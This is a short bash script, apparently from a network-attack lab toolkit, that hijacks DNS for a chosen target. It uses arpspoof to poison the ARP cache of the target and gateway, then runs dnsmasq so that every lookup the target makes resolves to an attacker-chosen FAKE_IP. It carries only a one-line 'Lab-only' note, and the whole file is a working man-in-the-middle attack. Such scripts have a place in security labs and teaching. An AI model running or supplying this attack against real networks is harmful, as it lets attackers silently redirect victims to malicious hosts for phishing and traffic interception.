#!/usr/bin/env bash
# Answer DNS on this host (dnsmasq) and redirect TARGET's port-53 traffic here via ARP spoofing,
# so lookups resolve to FAKE_IP instead of the real answer. Lab-only.
# Usage: TARGET=<ip> FAKE_IP=<ip> [GW=<ip>] [DURATION=20] ./dns-hijack.sh
set -euo pipefail
. "$(dirname "$0")/common.sh"
need dnsmasq; need arpspoof; need_target
: "${FAKE_IP:?set FAKE_IP=<ip> to return for every lookup}"
[[ -n $GW ]] || { echo "no gateway found on $IFACE, set GW=<ip>" >&2; exit 2; }
conf=$(mktemp); trap 'rm -f "$conf"; kill "${arp_pid:-0}" 2>/dev/null || true' EXIT
cat >"$conf" <<EOF
interface=$IFACE
bind-interfaces
port=53
no-resolv
no-hosts
address=/#/$FAKE_IP
EOF
sudo arpspoof -i "$IFACE" -t "$TARGET" "$GW" >/dev/null 2>&1 &
arp_pid=$!
echo "fake DNS on $IFACE for ${DURATION}s, answering everything with $FAKE_IP"
sudo timeout "$DURATION" dnsmasq -k -C "$conf" --pid-file="$(mktemp -u)" || true
